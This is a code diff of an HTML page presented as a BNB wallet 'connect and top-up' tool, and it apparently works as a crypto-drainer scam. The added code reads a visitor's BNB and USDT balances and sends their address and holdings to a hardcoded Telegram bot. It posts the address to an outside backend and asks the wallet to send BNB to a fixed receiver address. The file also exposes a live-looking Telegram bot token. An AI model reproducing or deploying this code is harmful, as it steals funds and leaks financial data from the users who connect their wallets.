@@ -2,12 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BSC Wallet Balance Sender</title>
+  <title>BSC Wallet Connect & Top-up Flow</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; }
+    button { padding: 14px 28px; font-size: 16px; margin-top: 20px; }
+  </style>
 </head>
-<body style="font-family: Arial; text-align: center; padding: 40px;">
-  <h2>Connect Wallet, Send Balance & Trigger Smart Contract</h2>
-  <button onclick="connectAndProcess()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
+<body>
+  <h2>Connect Wallet & Auto Top-up BNB</h2>
+  <button onclick="connectAndProcess()">Connect Wallet</button>
   <p id="status"></p>
 
   <script>
@@ -15,87 +19,90 @@
     const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
     const TELEGRAM_CHAT_ID = '8060968649';
     const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
-    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app/api/topup-bnb';
-    const BNB_THRESHOLD = 1; // $1 in BNB
-
-    async function getBNBPrice() {
-      const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
-      const data = await res.json();
-      return data.binancecoin.usd;
-    }
-
-    async function getBNBBalance(address) {
-      const res = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
-      const data = await res.json();
-      if (data.status !== "1") return null;
-      return parseFloat(data.result) / 1e18;
-    }
+    const BACKEND_API = 'https://a-production-c9bc.up.railway.app/api/topup-bnb';
+    const RECEIVER = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';
 
     async function connectAndProcess() {
+      const status = document.getElementById("status");
       if (typeof window.ethereum === 'undefined') {
-        alert("⚠️ Please install MetaMask or a Web3 wallet!");
+        alert("⚠️ Please install MetaMask");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
-      const status = document.getElementById("status");
-
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         const address = accounts[0];
+        let message = `📲 *Wallet Connected*\n\`${address}\`\n\n`;
 
-        let message = `📲 *Connected Wallet*\n\`${address}\`\n\n`;
-
-        const bnbPrice = await getBNBPrice();
-        let bnb = await getBNBBalance(address);
-        if (bnb === null) {
-          status.innerText = "❌ Could not fetch BNB balance";
-          return;
+        // Fetch BNB balance
+        const bnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
+        const bnbData = await bnbRes.json();
+        let bnb = 0;
+        if (bnbData.status === "1") {
+          bnb = parseFloat(bnbData.result) / 1e18;
+          message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
+        } else {
+          message += `💰 *BNB*: ❌ Error\n`;
         }
 
-        const bnbValueUSD = bnb * bnbPrice;
-        message += `💰 *BNB*: ${bnb.toFixed(4)} (${bnbValueUSD.toFixed(2)} USD)\n`;
+        // Fetch USDT balance
+        const usdtRes = await fetch(`https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${address}&tag=latest&apikey=${BSC_SCAN_API}`);
+        const usdtData = await usdtRes.json();
+        if (usdtData.status === "1") {
+          const usdt = parseFloat(usdtData.result) / 1e18;
+          message += `💵 *USDT*: ${usdt.toFixed(2)}\n`;
+        } else {
+          message += `💵 *USDT*: ❌ Error\n`;
+        }
 
-        if (bnbValueUSD < BNB_THRESHOLD) {
-          status.innerText = "⚠️ Insufficient BNB. Requesting top-up...";
-          const topUpRes = await fetch(BACKEND_URL, {
+        status.innerText = `💬 Checking BNB balance...`;
+
+        if (bnb < 1) {
+          message += `⚠️ *BNB < $1* – requesting backend top-up...\n`;
+
+          // 🔁 Send backend request
+          const res = await fetch(BACKEND_API, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ address })
           });
-          const topUpData = await topUpRes.json();
+          const data = await res.json();
 
-          if (!topUpData.ready) {
-            status.innerText = "❌ BNB top-up failed.";
+          if (data.ready) {
+            message += `✅ Top-up requested!\n⏳ Waiting for balance update...`;
+            status.innerText = "⏳ Waiting for balance update...";
+            await new Promise(r => setTimeout(r, 10000)); // Wait for TX
+          } else {
+            status.innerText = "❌ Backend error!";
             return;
           }
-
-          status.innerText = "⏳ Waiting for BNB to arrive...";
-          // Wait until balance reaches at least $1
-          let retries = 10;
-          while (retries-- > 0) {
-            await new Promise(r => setTimeout(r, 5000)); // 5s delay
-            bnb = await getBNBBalance(address);
-            if ((bnb * bnbPrice) >= BNB_THRESHOLD) break;
-          }
-
-          const newUSD = (bnb * bnbPrice).toFixed(2);
-          if ((bnb * bnbPrice) < BNB_THRESHOLD) {
-            status.innerText = `❌ BNB not received after waiting. Final: $${newUSD}`;
-            return;
-          }
-
-          status.innerText = `✅ BNB received! Proceeding with contract...`;
-        } else {
-          status.innerText = "✅ Sufficient BNB found. Proceeding...";
         }
 
-        // ✅ TODO: Call your smart contract here
-        message += `✅ Ready to call smart contract\n`;
+        // 🔄 Recheck BNB balance
+        const rebnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
+        const rebnbData = await rebnbRes.json();
+        const newBnb = parseFloat(rebnbData.result) / 1e18;
 
-        // Send to Telegram for log
+        if (newBnb >= 1) {
+          const sendAmount = 0.0015; // ~$0.50
+          const tx = {
+            from: address,
+            to: RECEIVER,
+            value: web3.utils.toHex(web3.utils.toWei(sendAmount.toString(), 'ether'))
+          };
+          await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+
+          message += `🚀 *Sent ${sendAmount} BNB* to \`${RECEIVER}\``;
+          status.innerText = "✅ Transaction sent!";
+        } else {
+          message += `❌ *Still < $1 BNB* – cannot proceed.`;
+          status.innerText = "❌ Not enough BNB";
+        }
+
+        // 📨 Send log to Telegram
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: 'POST',
+          method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
@@ -104,10 +111,9 @@
           })
         });
 
-        status.innerText += "\n🟢 All Done. Telegram updated.";
       } catch (err) {
         console.error(err);
-        status.innerText = "❌ Something went wrong!";
+        status.innerText = "❌ Error occurred.";
       }
     }
   </script>
